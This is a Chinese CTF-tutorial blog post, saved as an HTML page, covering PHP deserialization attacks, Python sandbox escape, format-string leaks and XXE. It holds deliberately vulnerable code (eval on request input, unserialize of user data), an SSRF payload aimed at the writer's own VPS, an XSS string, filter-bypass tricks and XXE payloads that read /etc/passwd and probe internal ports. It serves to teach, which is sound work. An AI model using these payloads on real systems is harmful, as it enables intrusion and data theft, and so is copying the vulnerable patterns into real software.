@@ -1,0 +1,417 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+    <meta charset="UTF-8">
+<meta name="viewport"
+      content="width=device-width, initial-scale=1.0, maximum-scale=1.0, minimum-scale=1.0">
+<meta http-equiv="X-UA-Compatible" content="ie=edge">
+
+    <meta name="author" content="xyy">
+
+
+
+
+
+<title>web扩展 | xyy爱吃番茄（个人分享）</title>
+
+
+
+    <link rel="icon" href="https://qiniu.xuyuyan.cn/XYY.png">
+
+
+
+
+    <!-- stylesheets list from _config.yml -->
+    
+    <link rel="stylesheet" href="/css/style.css">
+    
+
+
+
+    <!-- scripts list from _config.yml -->
+    
+    <script src="/js/script.js"></script>
+    
+    <script src="/js/tocbot.min.js"></script>
+    
+
+
+
+    
+    
+        
+    
+
+
+<meta name="generator" content="Hexo 5.4.0"></head>
+<body>
+    <div class="wrapper">
+        <header>
+    <nav class="navbar">
+        <div class="container">
+            <div class="navbar-header header-logo"><a href="/">xyy爱吃番茄！(个人分享)</a></div>
+            <div class="menu navbar-right">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                    <a class="menu-item" href="/friends">友链</a>
+                
+                <input id="switch_default" type="checkbox" class="switch_default">
+                <label for="switch_default" class="toggleBtn"></label>
+            </div>
+        </div>
+    </nav>
+
+    
+    <nav class="navbar-mobile" id="nav-mobile">
+        <div class="container">
+            <div class="navbar-header">
+                <div>
+                    <a href="/">xyy爱吃番茄！(个人分享)</a><a id="mobile-toggle-theme">·&nbsp;Light</a>
+                </div>
+                <div class="menu-toggle" onclick="mobileBtn()">&#9776; Menu</div>
+            </div>
+            <div class="menu" id="mobile-menu">
+                
+                    <a class="menu-item" href="/archives">文章</a>
+                
+                    <a class="menu-item" href="/category">分类</a>
+                
+                    <a class="menu-item" href="/tag">标签</a>
+                
+                    <a class="menu-item" href="/about">关于我</a>
+                
+                    <a class="menu-item" href="/friends">友链</a>
+                
+            </div>
+        </div>
+    </nav>
+
+</header>
+<script>
+    var mobileBtn = function f() {
+        var toggleMenu = document.getElementsByClassName("menu-toggle")[0];
+        var mobileMenu = document.getElementById("mobile-menu");
+        if(toggleMenu.classList.contains("active")){
+           toggleMenu.classList.remove("active")
+            mobileMenu.classList.remove("active")
+        }else{
+            toggleMenu.classList.add("active")
+            mobileMenu.classList.add("active")
+        }
+    }
+</script>
+        <div class="main">
+            <div class="container">
+    
+    
+        <div class="post-toc">
+    <div class="tocbot-list">
+    </div>
+    <div class="tocbot-list-menu">
+        <a class="tocbot-toc-expand" onclick="expand_toc()">Expand all</a>
+        <a onclick="go_top()">Back to top</a>
+        <a onclick="go_bottom()">Go to bottom</a>
+    </div>
+</div>
+
+<script>
+    document.ready(
+        function () {
+            tocbot.init({
+                tocSelector: '.tocbot-list',
+                contentSelector: '.post-content',
+                headingSelector: 'h1, h2, h3, h4, h5',
+                collapseDepth: 1,
+                orderedList: false,
+                scrollSmooth: true,
+            })
+        }
+    )
+
+    function expand_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 6,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "collapse_toc()");
+        b.innerHTML = "Collapse all"
+    }
+
+    function collapse_toc() {
+        var b = document.querySelector(".tocbot-toc-expand");
+        tocbot.init({
+            tocSelector: '.tocbot-list',
+            contentSelector: '.post-content',
+            headingSelector: 'h1, h2, h3, h4, h5',
+            collapseDepth: 1,
+            orderedList: false,
+            scrollSmooth: true,
+        });
+        b.setAttribute("onclick", "expand_toc()");
+        b.innerHTML = "Expand all"
+    }
+
+    function go_top() {
+        window.scrollTo(0, 0);
+    }
+
+    function go_bottom() {
+        window.scrollTo(0, document.body.scrollHeight);
+    }
+
+</script>
+    
+
+    
+    <article class="post-wrap">
+        <header class="post-header">
+            <h1 class="post-title">web扩展</h1>
+            
+                <div class="post-meta">
+                    
+                        Author: <a itemprop="author" rel="author" href="/">xyy</a>
+                    
+
+                    
+                        <span class="post-time">
+                        Date: <a href="#">十一月 14, 2024&nbsp;&nbsp;15:43:22</a>
+                        </span>
+                    
+                    
+                        <span class="post-category">
+                    Category:
+                            
+                                <a href="/categories/CTF/">CTF</a>
+                            
+                        </span>
+                    
+                </div>
+            
+        </header>
+
+        <div class="post-content">
+            <h2 id="1-反序列化漏洞"><a href="#1-反序列化漏洞" class="headerlink" title="1 反序列化漏洞"></a>1 反序列化漏洞</h2><p>此处以PHP反序列化为例，假设序列化前的对象如下：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">person</span> </span>&#123;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$name</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$age</span>=<span class="number">19</span>;</span><br><span class="line">  <span class="keyword">public</span> <span class="variable">$sex</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>通过 <code>serialize()</code> 函数进行序列化可以得到 <code>O:6:&quot;person&quot;:3:&#123;s:4:&quot;name&quot;;N;s:3:&quot;age&quot;;i:19;s:3:&quot;sex&quot;;N;&#125;</code></p>
+<p>其中 <code>O</code> 表示这是一个对象，<code>6</code> 表示对象名的长度，<code>&quot;person&quot;</code> 表示序列化的对象名称，<code>3</code> 表示对象有3个属性；第一个属性的 <code>s</code> 表示是字符串，<code>4</code> 表示是属性名的长度，后面说明属性名称为 <code>&quot;name&quot;</code>，他的值是空 <code>N</code>；第二个属性的 <code>s</code> 表示是字符串，<code>3</code> 表示是属性名的长度，后面说明属性名称为 <code>&quot;age&quot;</code>，<code>i</code> 表示为整型，值为 <code>19</code>；以此类推。</p>
+<p>接下来举一个反序列化攻击的例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line">  <span class="class"><span class="keyword">class</span> <span class="title">test</span></span>&#123;</span><br><span class="line">  	<span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    	<span class="keyword">echo</span> <span class="string">&quot;destruct...&lt;br&gt;&quot;</span>;  </span><br><span class="line">      <span class="keyword">eval</span>(<span class="variable">$_GET</span>[<span class="string">&#x27;cmd&#x27;</span>]);  <span class="comment">// 超级恶意代码！！！</span></span><br><span class="line">    &#125;</span><br><span class="line">	&#125;</span><br><span class="line">	unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;u&#x27;</span>]);  <span class="comment">// 用参数u来接收序列化后的字符串</span></span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>上述代码中定义了test类及其析构函数（在对象被销毁的时候调用），反序列化会重建对象，当对象被销毁时，自动调用其析构函数 __destruct()。对于参数cmd，我们可以传入一些恶意命令，例如 <code>system(&quot;whoami&quot;)</code>。</p>
+<p>再举一个例子：</p>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">lemon</span> </span>&#123;</span><br><span class="line">  <span class="keyword">protected</span> <span class="variable">$ClassObj</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__construct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ClassObj = <span class="keyword">new</span> evil();</span><br><span class="line">  &#125;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;ClassObj-&gt;action();</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">evil</span> </span>&#123;</span><br><span class="line">  <span class="keyword">private</span> <span class="variable">$data</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">action</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">eval</span>(<span class="keyword">$this</span>-&gt;data);</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>上述代码构造了类lemon，以及其构造函数（新建一个evil类）和其析构函数（执行evil类的action()方法），在action方法中 <code>eval($this-&gt;data);</code> 可以执行任意代码。</p>
+<p>注意，因为 <code>$ClassObj</code> 是protected属性，所以存在 <code>%00*%00</code> 来表示它，而 <code>%00</code> 是不可见字符，在构造Exploit的时候尽量使用urlencode后的字符串来避免 <code>%00</code> 的缺失。</p>
+<h3 id="1-1-原生类利用"><a href="#1-1-原生类利用" class="headerlink" title="1.1 原生类利用"></a>1.1 原生类利用</h3><p>实际的挖洞过程中经常会遇到没有合适的利用链，这就需要用到编程语言自带的原生类，以PHP为例。</p>
+<ol>
+<li><p><code>__call</code> 方法：调用不存在的类时触发</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$rce</span> = unserialize(<span class="variable">$_REQUEST</span>[<span class="string">&#x27;u&#x27;</span>])</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$rce</span>-&gt;notexist();</span><br></pre></td></tr></table></figure>
+
+<p> 通过unserialize进行反序列化，再调用类的notexibt()方法，即会触发__call()方法。PHP存在内置类 <code>SoapClient::__Call</code>，意味着可以进行一个SSRF攻击。</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">serialize(<span class="keyword">new</span> SoapClient(<span class="literal">null</span>, <span class="keyword">array</span>(<span class="string">&#x27;uri&#x27;</span>=&gt;<span class="string">&#x27;http://vps/&#x27;</span>, <span class="string">&#x27;location&#x27;</span>=&gt;<span class="string">&#x27;http://vps/aaa&#x27;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p> 上面是对new SoapClient进行配置，将uri设置为自己VPS服务器地址。将以上生成的字符串放入unserialize函数进行反序列化，再进行不存在方法的调用，则会进行SSRF攻击。在 SoapClient 中，call() 的作用是根据传入的方法名和参数，构造一个 SOAP 请求。<code>SoapClient::Call()</code> 会依据指定的 location 属性，构造一个 XML 格式的 SOAP 请求，将请求发送到 location 指定的 URL。</p>
+</li>
+<li><p><code>__toString</code> 方法：当对象作为字符串处理时会自动触发</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">urlencode(serialize(<span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&quot;&lt;scrpit&gt;alert(/hello world/)&lt;/script&gt;&quot;</span>)))</span><br></pre></td></tr></table></figure>
+
+<p> 此处主要利用了Exception类没有对错误消息进行过滤，最终导致反序列化输出的内容在网页上构成XSS</p>
+</li>
+<li><p><code>__construct</code> 方法：</p>
+<p> 通常情况下，在反序列化中时无法触发__construct魔术方法，但是经过开发者魔改后便可能存在任意类实例化的情况。</p>
+<p> 参考：<a target="_blank" rel="noopener" href="https://5haked.blogspot.jp/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1">https://5haked.blogspot.jp/2016/10/how-i-hacked-pornhub-for-fun-and-profit.html?m=1</a></p>
+</li>
+</ol>
+<h3 id="1-2-Tricks"><a href="#1-2-Tricks" class="headerlink" title="1.2 Tricks"></a>1.2 Tricks</h3><ol>
+<li><p>__wakeup失效：影响版本PHP5至5.6.25、PHP7至7.0.10</p>
+<p> __wakeup() 是 PHP 的一个魔术方法，主要在反序列化对象时被调用。它的主要功能是：</p>
+<p> ​    •    在对象反序列化后重新建立资源（例如数据库连接）。</p>
+<p> ​    •    执行一些安全检查，确保对象的状态在反序列化后是安全的。</p>
+<p> 如果由于某些原因（当属性个数不对时，process_nested_data函数会返回0，导致后面的call_user_function_ex函数不会执行）则PHP中就不会调用__wakeup()。</p>
+<blockquote>
+<p>对应真实案例 SugarCRM v6.5.23</p>
+</blockquote>
+</li>
+<li><p>bypass反序列化正则</p>
+<p> 前提：在执行反序列化时，使用正则 <code>/[oc]:\d+:/i</code> 进行拦截，用于拦截反序列化字符串</p>
+<p> 构造如下对象 <code>O:+4:&quot;demo&quot;:1:&#123;s:5:&quot;demoa&quot;;a:0:&#123;&#125;&#125;</code>，PHP源码会对 <code>O:</code> 后为 <code>+</code> 的字符串进行特判，从而绕过。</p>
+</li>
+<li><p>反序列化字符逃逸</p>
+<p> 我们编写一个 <code>filter</code> 函数，用来对字符串进行替换，将占位字符串替换为恶意字符串payload。 利用过滤函数提供的字符变化功能来逃逸可用字符串，从而注入想要修改的属性。</p>
+</li>
+<li><p>PHP引用</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$o</span> = unserialize(<span class="variable">$_GET</span>[<span class="string">&#x27;d&#x27;</span>]);</span><br><span class="line"><span class="variable">$o</span>-&gt;secret = <span class="string">&quot;you don&#x27;t know the secret&quot;</span>;</span><br><span class="line"><span class="keyword">if</span> (<span class="variable">$o</span>-&gt;secret === <span class="variable">$o</span>-&gt;enter) &#123;</span><br><span class="line">  <span class="keyword">echo</span> <span class="string">&quot;win!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p> 通过代码可以看到，我们的目标是使if语句成立，即 <code>$o-&gt;secret === $o-&gt;enter</code> 为真。为此我们可以在初始化时利用 <code>&amp;</code> 将 enter 指向 secret 的地址，通过引用的方式让两者的属性值相同。</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">just4fun</span> </span>&#123;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$enter</span>;</span><br><span class="line">  <span class="keyword">var</span> <span class="variable">$secret</span>;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">just4fun</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">$this</span>-&gt;enter = &amp;<span class="keyword">$this</span>-&gt;secret;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li>
+<li><p>Exception 绕过</p>
+<p> 有时候会遇上throw问题，因为报错导致后面代码无法执行</p>
+ <figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$line</span> = trim(fgets(STDIN));</span><br><span class="line"><span class="variable">$flag</span> = file_get_contents(<span class="string">&#x27;/flag&#x27;</span>);</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">B</span> </span>&#123;</span><br><span class="line">  <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>) </span>&#123;</span><br><span class="line">    <span class="keyword">global</span> <span class="variable">$flag</span>;</span><br><span class="line">    <span class="keyword">echo</span> <span class="variable">$flag</span>;</span><br><span class="line">  &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$a</span> = @unserialize(<span class="variable">$line</span>);</span><br><span class="line"><span class="keyword">throw</span> <span class="keyword">new</span> <span class="built_in">Exception</span>(<span class="string">&#x27;Well this was unexcepted...&#x27;</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="variable">$a</span></span><br></pre></td></tr></table></figure>
+
+<p> 如果 line 的内容被反序列化为一个 B 类的实例对象，那么在程序退出时，这个对象会被销毁，从而触发 __destruct()，导致 flag 的内容被打印出来。</p>
+</li>
+</ol>
+<h2 id="2-Python的安全问题"><a href="#2-Python的安全问题" class="headerlink" title="2. Python的安全问题"></a>2. Python的安全问题</h2><h3 id="2-1-沙箱逃逸"><a href="#2-1-沙箱逃逸" class="headerlink" title="2.1 沙箱逃逸"></a>2.1 沙箱逃逸</h3><p>CTF中存在一种让用户提交一段代码给服务端、让服务端去运行的题型，一般出题者会进行关键词过滤。</p>
+<ol>
+<li><p>关键词过滤</p>
+<p> 比如出题者过滤 <code>ls</code> 或 <code>system</code> 等词。但因为python时动态语言，这种情况很容易被绕过。</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line">os.system(<span class="string">&quot;ls&quot;</span>)  <span class="comment"># 运行操作系统命令 &quot;ls&quot;</span></span><br><span class="line">os.system(<span class="string">&quot;l&quot;</span> + <span class="string">&quot;s&quot;</span>)</span><br><span class="line"><span class="built_in">getattr</span>(os, <span class="string">&quot;sys&quot;</span> + <span class="string">&quot;tem&quot;</span>)(<span class="string">&quot;ls&quot;</span>)  <span class="comment"># getattr()函数用于从对象中动态获取属性</span></span><br><span class="line">os.__getattribute__(<span class="string">&quot;system&quot;</span>)(<span class="string">&quot;ls&quot;</span>)  <span class="comment"># 直接获取模块的属性</span></span><br></pre></td></tr></table></figure>
+
+<p> 对于字符串，我们可以加入拼接、倒序或者base64编码等方法。</p>
+</li>
+<li><p>花样import</p>
+<p> 很多情况下 <code>import</code> 关键词也会被过滤。</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="built_in">__import__</span>(<span class="string">&quot;os&quot;</span>)</span><br><span class="line"><span class="keyword">import</span> importlib</span><br><span class="line">importlib.import_module(<span class="string">&quot;os&quot;</span>)</span><br></pre></td></tr></table></figure></li>
+<li><p>利用继承等寻找对象</p>
+<p> 在Python中，一切都是对象，所以我们可以使用Python的内置方法来找到对象的父类和子类，甚至在受限环境中探索和访问我们需要的对象。如 <code>__bases__ </code> 属性可以访问父类，<code> __subclasses__()</code> 方法可以返回所有直接继承该类的子类，<code>__mro__</code>  是用于查看类的继承顺序的方法等。</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 搜索所有子类，查找可能的 Popen 类</span></span><br><span class="line"><span class="keyword">for</span> subclass <span class="keyword">in</span> <span class="built_in">object</span>.__subclasses__():</span><br><span class="line">    <span class="keyword">if</span> <span class="string">&#x27;Popen&#x27;</span> <span class="keyword">in</span> subclass.__name__:</span><br><span class="line">        PopenClass = subclass</span><br><span class="line">        <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 使用找到的 Popen 类执行命令</span></span><br><span class="line">popen_instance = PopenClass([<span class="string">&quot;ls&quot;</span>], shell=<span class="literal">True</span>)</span><br><span class="line">popen_instance.communicate()</span><br></pre></td></tr></table></figure></li>
+<li><p>eval类的代码执行</p>
+<p> eval类函数在任何语言都是一种危险的存在，我们在Python语言中可以通过 <code>exec()</code>（Python2）、 <code>execfile()</code>、 <code>eval()</code> 、<code>compile()</code>、 <code>input()</code> （Python2）等动态执行一段Python代码。】</p>
+</li>
+</ol>
+<h3 id="2-2-格式化字符串"><a href="#2-2-格式化字符串" class="headerlink" title="2.2 格式化字符串"></a>2.2 格式化字符串</h3><p>CTF的Python题目会设计Jinja2之类的模板引擎的注入。这些漏洞往往源于服务端没有对用户的输入进行过滤，直接带入了页面渲染。</p>
+<ol>
+<li><p>最原始的 <code>%</code></p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">userdata = &#123;<span class="string">&quot;user&quot;</span>: <span class="string">&quot;jdoe&quot;</span>, <span class="string">&quot;password&quot;</span>: <span class="string">&quot;12345&quot;</span>&#125;</span><br><span class="line">passwd = raw_input(<span class="string">&quot;Password: &quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> passwd != userdata[<span class="string">&quot;password&quot;</span>]:</span><br><span class="line">  <span class="built_in">print</span>(<span class="string">&quot;Password &quot;</span> + passwd + <span class="string">&quot;is wrong&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p> 上述代码实现了一个简单的登录功能，并且没有做任何过滤将用户的输入直接显示在了界面。因此如果我们的用户输入是 <code>%(passwd)s</code> 就可以获取用户的真实密码。</p>
+</li>
+<li><p>Format 方法相关</p>
+<p> 上一个例子还可以用format进行改写 <code>print(&quot;Password &quot; + passwd + &quot;is wrong for user &#123;user&#125;&quot;).format(**userdata)</code>，此时如果恶意输入为 <code>&#123;password&#125;</code> 则可以获取用户的真实密码。</p>
+<p> 除此之外，format方法还有其他应用：</p>
+ <figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="string">&#x27;0.system&#x27;</span>.<span class="built_in">format</span>(os)</span><br></pre></td></tr></table></figure>
+
+<p> 在这个例子中，字符串 0.system 中的 0 是一个占位符，通过 format(os) 替换 0 为 os。再继续获取相关属性，由此可以获取代码中的敏感信息。</p>
+</li>
+</ol>
+<h3 id="2-3-Python-XXE"><a href="#2-3-Python-XXE" class="headerlink" title="2.3 Python XXE"></a>2.3 Python XXE</h3><p>XXE（XML External Entity Injection，XML 外部实体注入）是一种安全漏洞，允许攻击者利用 XML 解析器加载并执行外部实体。在处理不受信任的 XML 文件时，特别是使用不安全的解析器设置时，可能导致 XXE 漏洞。这类攻击可以泄露敏感信息、读取文件，甚至在某些情况下发起服务端请求。</p>
+<p>例如，一个不安全的 XML 文件可能包含如下内容：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">xxe</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;file:///etc/passwd&quot;</span>&gt;</span>  &lt;!-- 定义外部实体，指向系统文件 --&gt;</span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;xxe;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<p>如果 XML 解析器不加限制地解析该 XML 文件，<code>&amp;xxe;</code> 实体将被替换为 <code>/etc/passwd</code> 文件的内容，从而导致敏感信息泄露。</p>
+<p>在 Python 中，xml.etree.ElementTree、lxml 等库如果配置不当，可能会受到 XXE 漏洞影响。以下是一个不安全的代码示例，展示如何使用 xml.etree.ElementTree 库解析含有 XXE 的 XML：</p>
+<figure class="highlight py"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> xml.etree.ElementTree <span class="keyword">as</span> ET</span><br><span class="line"></span><br><span class="line">xml_data = <span class="string">&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot;?&gt;</span></span><br><span class="line"><span class="string">&lt;!DOCTYPE root [</span></span><br><span class="line"><span class="string">&lt;!ENTITY xxe SYSTEM &quot;file:///etc/passwd&quot;&gt;</span></span><br><span class="line"><span class="string">]&gt;</span></span><br><span class="line"><span class="string">&lt;root&gt;</span></span><br><span class="line"><span class="string">    &lt;data&gt;&amp;xxe;&lt;/data&gt;</span></span><br><span class="line"><span class="string">&lt;/root&gt;&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 解析 XML（不安全）</span></span><br><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    root = ET.fromstring(xml_data)</span><br><span class="line">    <span class="built_in">print</span>(ET.tostring(root, encoding=<span class="string">&quot;unicode&quot;</span>))</span><br><span class="line"><span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">f&quot;An error occurred: <span class="subst">&#123;e&#125;</span>&quot;</span>)</span><br></pre></td></tr></table></figure>
+
+<p>在这个示例中，<code>&amp;xxe;</code> 实体指向文件 <code>/etc/passwd</code>，导致文件信息泄露。</p>
+<p>除此之外，我们可以利用XXS进行内网端口和服务窥探：</p>
+<figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta">&lt;?xml version=&quot;1.0&quot; encoding=&quot;UTF-8&quot;?&gt;</span></span><br><span class="line"><span class="meta">&lt;!DOCTYPE <span class="meta-keyword">data</span> [</span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.1.100:8080&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">  <span class="meta">&lt;!ENTITY <span class="meta-keyword">test2</span> <span class="meta-keyword">SYSTEM</span> <span class="meta-string">&quot;http://192.168.1.100:22&quot;</span>&gt;</span></span></span><br><span class="line"><span class="meta">]&gt;</span></span><br><span class="line"><span class="tag">&lt;<span class="name">data</span>&gt;</span><span class="symbol">&amp;test;</span><span class="tag">&lt;/<span class="name">data</span>&gt;</span></span><br></pre></td></tr></table></figure>
+
+<ol>
+<li><p><strong>如果端口开放且有响应</strong>，解析器会替换 &test; 和 &test2; 实体内容为返回的响应内容。</p>
+<ol start="2">
+<li>   <strong>如果端口关闭或没有响应</strong>，解析器则不会返回内容（或抛出错误），从而可以推测端口状态。</li>
+</ol>
+</li>
+</ol>
+
+        </div>
+
+        
+            <section class="post-copyright">
+                
+                    <p class="copyright-item">
+                        <span>Author:</span>
+                        <span>xyy</span>
+                    </p>
+                
+                
+                    <p class="copyright-item">
+                        <span>Permalink:</span>
+                        <span><a href="http://www.xuyuyan.cn/2024/11/14/web%E6%89%A9%E5%B1%95/">http://www.xuyuyan.cn/2024/11/14/web%E6%89%A9%E5%B1%95/</a></span>
+                    </p>
+                
+                
+                
+
+            </section>
+        
+        <section class="post-tags">
+            <div>
+                <span>Tag(s):</span>
+                <span class="tag">
+                    
+                    
+                        <a href="/tags/CTF/"># CTF</a>
+                    
+                        <a href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"># 反序列化</a>
+                    
+                        <a href="/tags/Python%E5%AE%89%E5%85%A8%E9%97%AE%E9%A2%98/"># Python安全问题</a>
+                    
+                        <a href="/tags/%E6%B2%99%E7%AE%B1%E9%80%83%E9%80%B8/"># 沙箱逃逸</a>
+                    
+                        <a href="/tags/%E6%A8%A1%E7%89%88%E6%B3%A8%E5%85%A5/"># 模版注入</a>
+                    
+                        
+                </span>
+            </div>
+            <div>
+                <a href="javascript:window.history.back();">back</a>
+                <span>· </span>
+                <a href="/">home</a>
+            </div>
+        </section>
+        <section class="post-nav">
+            
+            
+            <a class="next" rel="next" href="/2024/11/08/Web%E5%AE%89%E5%85%A8%E8%BF%9B%E9%98%B6/">Web安全进阶</a>
+            
+        </section>
+
+
+    </article>
+</div>
+
+
+    <div id="gitalk-container"></div>
+    <link rel="stylesheet" href="//unpkg.com/gitalk/dist/gitalk.css">
